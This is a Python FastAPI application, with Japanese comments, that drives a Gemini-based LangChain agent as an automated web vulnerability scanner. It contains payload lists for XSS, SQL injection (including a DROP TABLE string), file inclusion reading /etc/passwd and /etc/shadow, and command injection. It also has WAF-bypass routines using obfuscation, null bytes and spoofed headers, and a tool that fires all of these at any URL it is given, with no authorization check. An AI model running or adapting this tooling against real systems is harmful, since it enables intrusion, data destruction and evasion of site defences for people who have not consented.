import os
import uvicorn
from fastapi import FastAPI, APIRouter, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field
from dotenv import load_dotenv
from typing import Optional, List, Dict
import asyncio
import httpx
import re
from bs4 import BeautifulSoup
import random
import string
import time
from urllib.parse import quote_plus

from langchain_google_genai import ChatGoogleGenerativeAI
from langchain.agents import AgentExecutor, create_tool_calling_agent
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langchain_core.tools import tool
from langchain.memory import ConversationBufferMemory

# --- FastAPIとAPIRouterのインスタンスを生成 ---
load_dotenv()
app = FastAPI()
router = APIRouter()

# --- WAFバイパス手法を適用するヘルパー関数 ---
def apply_waf_bypass(payload: str, bypass_technique: str) -> str:
    """
    指定されたバイパス手法をペイロードに適用する。
    """
    if bypass_technique == "case_obfuscation":
        return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)
    elif bypass_technique == "url_encoding":
        return quote_plus(payload)
    elif bypass_technique == "character_substitution":
        return payload.replace(" ", "+").replace("<", "%3C").replace(">", "%3E")
    elif bypass_technique == "add_null_byte":
        return payload.replace("'", "%00'")
    return payload

# --- 脆弱性ペイロード生成関数 ---
def generate_xss_payloads() -> List[str]:
    """
    XSS攻撃用のより広範なペイロードリストを生成する。
    """
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS');",
        "';alert('XSS');//",
        "\"-confirm(1)-",
        "<body onload='alert(\"XSS\")'>",
        "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        "<a href='javascript:alert(\"XSS\")'>click</a>",
        "<img src='#' onerror='alert(1)'>",
        "<p>test<svg/onload=alert(1)>",
        "<div onmousemove=alert(1)>",
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
    ]

def generate_sqli_payloads() -> List[str]:
    """
    SQLi攻撃用のより広範なペイロードリストを生成する。
    """
    return [
        "' OR 1=1--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' OR '1'='1'#",
        "admin' --",
        "admin' #",
        "sleep(5)",
        "benchmark(10000000,MD5(1))",
        "' OR 1=2",
        "\" OR 1=1--",
        "1' OR '1'='1",
        "1; DROP TABLE users;--",
        "' AND 1=2 UNION SELECT 'A', 'B', 'C'",
        "' WAITFOR DELAY '0:0:5'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
    ]

def generate_lfi_payloads() -> List[str]:
    """
    LFI（ローカルファイルインクルージョン）攻撃用のペイロードリストを生成する。
    """
    return [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../../../../../../../../../../../../windows/win.ini",
        "file:///etc/passwd",
        "/proc/self/cmdline"
    ]

def generate_rce_payloads() -> List[str]:
    """
    RCE（リモートコード実行）攻撃用のペイロードリストを生成する。
    """
    return [
        ";ls -la;",
        "|id|",
        "`id`",
        "|ping -c 4 127.0.0.1|",
        "&&id",
        "%26%26id",
        ";cat /etc/passwd",
        "() { :; }; /bin/eject",
    ]

# --- ツール定義 ---
@tool
async def send_http_request_with_payload(url: str, method: str, payload_type: str, data: str = None, headers: dict = None) -> str:
    """
    指定されたURLにHTTPリクエストを送信し、複数のWAFバイパス手法を試行しながら脆弱性ペイロードをテストする。
    """
    bypass_techniques = ["case_obfuscation", "url_encoding", "character_substitution", "add_null_byte"]
    
    bypass_headers_list = [
        {},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36','X-Forwarded-For': '127.0.0.1'},
        {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)','Referer': 'https://www.google.com/'}
    ]

    async with httpx.AsyncClient() as client:
        try:
            initial_response = await client.request(method, url, data=data, headers=headers, timeout=15)
            
            for technique in bypass_techniques:
                for bypass_headers in bypass_headers_list:
                    modified_data = apply_waf_bypass(data, technique) if data else None
                    combined_headers = {**(headers or {}), **bypass_headers}

                    try:
                        response_bypass = await client.request(method, url, data=modified_data, headers=combined_headers, timeout=15)
                        
                        if initial_response.status_code in [403, 406, 503] and response_bypass.status_code == 200:
                            return f"WAF Bypass SUCCESS with {technique} and {bypass_headers}! Original request was blocked ({initial_response.status_code}), but bypass was successful ({response_bypass.status_code}). Response Body: {response_bypass.text[:500]}"
                        
                        vulnerability_flags = []
                        response = response_bypass
                        
                        if payload_type == "sqli":
                            sql_error_patterns = [r"sql syntax", r"mysql", r"query error", r"unclosed quotation", r"driver error", r"postgis error", r"pg_error", r"ora-[0-9]+"]
                            if response.status_code == 500 or any(re.search(p, response.text, re.IGNORECASE) for p in sql_error_patterns):
                                vulnerability_flags.append("SQLI_ERROR_DETECTED")
                                
                        if payload_type == "xss":
                            if modified_data and str(modified_data) in response.text:
                                vulnerability_flags.append("XSS_PAYLOAD_REFLECTED")

                        if payload_type == "path_traversal" or payload_type == "lfi":
                            if re.search(r"root:[xX]:0:0:|c:\\windows|etc/passwd|/etc/passwd", response.text, re.IGNORECASE):
                                vulnerability_flags.append("PATH_TRAVERSAL_CONTENT_DETECTED")

                        if payload_type == "ssrf":
                            if re.search(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2[0-9]|3[0-1])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}", response.text):
                                vulnerability_flags.append("SSRF_INTERNAL_IP_DETECTED")
                        
                        if payload_type == "rce":
                            if re.search(r"uid=\d+\(.*?\)|windows", response.text, re.IGNORECASE):
                                vulnerability_flags.append("RCE_COMMAND_OUTPUT_DETECTED")

                        flags_str = " | ".join(vulnerability_flags) if vulnerability_flags else "No specific vulnerability pattern detected."
                        
                        if vulnerability_flags:
                             return f"Status Code: {response.status_code}\nFlags: {flags_str}\nResponse Body (Text): {response.text[:500]}"
                    
                    except httpx.HTTPStatusError as e:
                        print(f"HTTP Error during bypass attempt: {e}")
                    except Exception as e:
                        print(f"Unexpected error during bypass attempt: {e}")

            return "WAF bypass attempts failed. No vulnerabilities detected with these methods."
            
        except httpx.RequestError as e:
            raise HTTPException(status_code=500, detail=f"Request Error: {e}")

@tool
async def detect_waf(url: str) -> str:
    """
    指定されたURLに対してWAF (Web Application Firewall) の有無を検出する。
    """
    try:
        async with httpx.AsyncClient() as client:
            response = await client.get(url, timeout=10)
            waf_indicators = {"Cloudflare": "cloudflare", "Sucuri": "sucuri", "AWS WAF": "awselb", "Imperva": "imperva", "Akamai": "akamai", "Wordfence": "wordfence"}
            for indicator, name in waf_indicators.items():
                if name in response.headers.get('Server', '').lower() or name in response.text.lower():
                    return f"WAF detected: {indicator}"
            return "No known WAF detected."
    except httpx.RequestError as e:
        raise HTTPException(status_code=500, detail=f"WAF detection error: {e}")

# --- Pydantic モデル定義 (変更なし) ---
class TechStackItem(BaseModel):
    name: str = Field(..., description="技術スタックの名前 (例: 'PHP', 'WordPress')")
    version: Optional[str] = Field(None, description="バージョン情報")
class ScanInput(BaseModel):
    url: str = Field(..., description="スキャン対象のベースURL")
    target_endpoint: str = Field(..., description="脆弱性をテストするエンドポイント (例: '/search.php')")
    tech_stack: Optional[List[TechStackItem]] = Field(None, description="ターゲットの技術スタック情報")
    vulnerability_types: Optional[List[str]] = Field(["xss", "sql_injection", "path_traversal", "ssrf", "lfi", "rce"], description="診断する脆弱性タイプ")

# --- APIエンドポイント ---
@router.post("/start_scan")
async def start_scan(scan_input: ScanInput):
    llm = ChatGoogleGenerativeAI(model="gemini-1.5-flash")
    
    tools = [
        send_http_request_with_payload, 
        detect_waf,
    ]
    memory = ConversationBufferMemory(memory_key="chat_history", return_messages=True)
    
    agent_prompt = ChatPromptTemplate.from_messages([
        ("system", "あなたはバグバウンティの専門家であり、高度なウェブ脆弱性スキャナーです。"),
        ("system", "ユーザーが提供する情報に基づき、段階的に脆弱性を検証してください。"),
        ("system", "あなたの思考プロセスは以下のステップに従います:"),
        ("system", "1. まず、`detect_waf`ツールを使用して、ターゲットURLにWAFが存在するかどうかを判断します。"),
        ("system", "2. WAFの検出結果とユーザーの入力に基づいて、提供されたペイロードリストから脆弱性タイプごとにテストを開始します。"),
        ("system", "3. `send_http_request_with_payload`ツールを使用して、各ペイロードをターゲットエンドポイントに送信します。**この時、`method`は'POST'、`payload_type`は該当する脆弱性タイプ（例: 'xss', 'sql_injection', 'path_traversal', 'rce'）、`data`はペイロードをキーと値のペアとして含むJSON文字列（例: '{\"query\":\"<script>alert(\\'XSS\\')</script>\"}'）を生成し、URLエンコードして使用します。**"),
        ("system", "4. 各リクエストのレスポンスを注意深く分析し、脆弱性の兆候（Flags）を探します。"),
        ("system", "5. すべての脆弱性タイプとすべてのペイロードを試行し終えたら、見つかった脆弱性の詳細と、見つからなかった場合はその旨をまとめた最終報告書を作成します。"),
        ("system", "攻撃ペイロードの生成、応答の分析、報告書の作成はすべてあなたの思考プロセスで行い、必要に応じて適切なツールを呼び出してください。"),
        ("system", "レスポンスの`Flags`に`XSS_PAYLOAD_REFLECTED`、`SQLI_ERROR_DETECTED`、`PATH_TRAVERSAL_CONTENT_DETECTED`、`RCE_COMMAND_OUTPUT_DETECTED`のいずれかが含まれていたら、脆弱性が存在すると判断し、詳細な報告書に含めてください。"),
        MessagesPlaceholder("chat_history"),
        ("human", "{input}"),
        MessagesPlaceholder("agent_scratchpad"),
    ])
    
    agent = create_tool_calling_agent(llm, tools, agent_prompt)
    agent_executor = AgentExecutor(
        agent=agent,
        tools=tools,
        verbose=True,
        memory=memory
    )
    
    # --- すべてのペイロードを生成 ---
    all_xss_payloads = generate_xss_payloads()
    all_sqli_payloads = generate_sqli_payloads()
    all_lfi_payloads = generate_lfi_payloads()
    all_rce_payloads = generate_rce_payloads()
    
    # --- プロンプトにすべてのペイロードリストを含める ---
    tech_stack_str = ", ".join([f"{item.name} {item.version}" if item.version else item.name for item in scan_input.tech_stack]) if scan_input.tech_stack else "情報なし"
    
    initial_input = f"""
    ターゲットURL: {scan_input.url}
    攻撃対象エンドポイント: {scan_input.target_endpoint}
    技術スタック: {tech_stack_str}
    診断する脆弱性タイプ: {', '.join(scan_input.vulnerability_types)}
    
    以下のペイロードをすべて順番に試行してください。
    XSSペイロード: {', '.join(all_xss_payloads)}
    SQLiペイロード: {', '.join(all_sqli_payloads)}
    LFIペイロード: {', '.join(all_lfi_payloads)}
    RCEペイロード: {', '.join(all_rce_payloads)}
    
    上記情報に基づき、脆弱性スキャンを開始してください。
    """
    try:
        result = await agent_executor.ainvoke({"input": initial_input, "query": initial_input})
        final_report = result.get('output', '診断中に予期せぬエラーが発生しました。')
        return {"status": "scanning_complete", "final_report": final_report}
    except Exception as e:
        return {"status": "error", "final_report": f"診断中にエラーが発生しました: {e}"}



# --- ヘルスチェックとフロントエンド (変更なし) ---
@app.get("/health")
async def health_check():
    return {"status": "ok"}
@app.get("/", response_class=HTMLResponse)
async def serve_frontend():
    html_content = """
    <!DOCTYPE html><html><head><title>脆弱性スキャナー</title><style>body { font-family: sans-serif; margin: 2em; } input, button { padding: 0.5em; margin-top: 0.5em; } #output { margin-top: 1em; padding: 1em; border: 1px solid #ccc; background-color: #f9f9f9; white-space: pre-wrap; word-wrap: break-word; }</style></head><body><h1>脆弱性スキャン</h1><p>ターゲット情報を入力してスキャンを開始してください。</p><hr><label for="url">ベースURL:</label><br><input type="text" id="url" value="http://localhost:8000" size="50"><br><label for="endpoint">攻撃対象エンドポイント:</label><br><input type="text" id="endpoint" value="/search" size="50"><br><label for="tech_stack">技術スタック (カンマ区切り):</label><br><input type="text" id="tech_stack" value="WordPress 5.8, Apache 2.4.46" size="50"><br><button onclick="startScan()">スキャン開始</button><div id="output"></div><script>async function startScan() { const url = document.getElementById('url').value; const endpoint = document.getElementById('endpoint').value; const techStackInput = document.getElementById('tech_stack').value; const outputDiv = document.getElementById('output'); outputDiv.textContent = 'スキャンを開始しています...'; const techStackArray = techStackInput.split(',').map(item => { const parts = item.trim().split(' '); const name = parts.shift(); const version = parts.join(' ') || null; return { name: name, version: version }; }); const scanData = { url: url, target_endpoint: endpoint, tech_stack: techStackArray, vulnerability_types: ["xss", "sql_injection", "path_traversal", "ssrf"] }; try { const response = await fetch('/start_scan', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(scanData) }); const result = await response.json(); if (response.ok) { outputDiv.textContent = 'スキャン完了\\n\\n' + result.final_report; } else { outputDiv.textContent = 'エラー: ' + (result.detail || JSON.stringify(result)); } } catch (error) { outputDiv.textContent = 'ネットワークエラー: ' + error.message; } }</script></body></html>
    """
    return HTMLResponse(content=html_content)

# --- FastAPI ルーティング (変更なし) ---
app.include_router(router)

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
